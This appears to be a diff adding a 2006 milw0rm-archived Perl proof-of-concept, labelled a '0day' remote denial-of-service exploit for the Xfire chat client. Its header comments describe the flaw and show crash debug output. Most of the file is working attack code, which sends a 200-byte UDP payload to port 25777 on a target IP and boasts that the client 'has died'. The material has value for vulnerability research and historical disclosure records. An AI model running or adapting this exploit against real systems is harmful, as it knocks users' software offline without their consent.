@@ -1,0 +1,86 @@
+#!/usr/bin/perl
+#Moderator of http://igniteds.net
+##############################################################################
+#X fire version:new Release 1.64 <12th, 2006>
+##############################################################################
+#Vendors web site http://www.xfire.com/
+#remote exploit coded by: n00b..
+#Credit's to n00b for finding this bug..
+#Xfire client has a dos exploit closing the client upon
+#success full exploitation xfire will fail..Ive provided the following
+#Proof of concept for the exploit..This exploit happens when a malicious
+#packet is sent to the client on port udp port 25777 this will throw an exception
+#causing xfire to terminate.Tested on win xp service pack 1 + 2.
+#this is an example of the error on success full exploitation on the client side.
+#################################################################################
+#
+#          Error microsoft visual c++ runtime library
+#
+#          program: c:\program files\xfire\xfire.exe
+#
+#          r6025
+#                  - pure virtual function call.
+#################################################################################
+#Debugging info available at crash time.
+#
+# eax=77c280e4 ebx=00000000 ecx=77c112b0 edx=77c61a70 esi=7c90e88e edi=000000ff
+# eip=7c90eb94 esp=0012f5dc ebp=0012f6d8 iopl=0         nv up ei pl zr na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+# ntdll!KiFastSystemCallRet:
+# 7c90eb94 c3              ret
+#################################################################################
+#the following is the proof of concept available..
+ 
+print " 0day Xfire remote dos exploit coded by n00b Release 1.64 <12th, 2006> \n";
+ 
+use IO::Socket;
+ 
+$ip = $ARGV[0];
+ 
+$payload = "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41".
+           "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41";
+ 
+
+if(!$ip)
+{
+ 
+die "remember the ip\n";
+ 
+}
+ 
+$port = '25777';
+ 
+$protocol = 'udp';
+ 
+
+$socket = IO::Socket::INET->new(PeerAddr=>$ip,
+                               PeerPort=>$port,
+                               Proto=>$protocol,
+                               Timeout=>'1') || die "Make sure service is running on the port\n";
+ 
+
+print $socket $payload;
+ 
+close($socket);
+ 
+print "client has died h00ha \n";
+
+# milw0rm.com [2006-10-16]
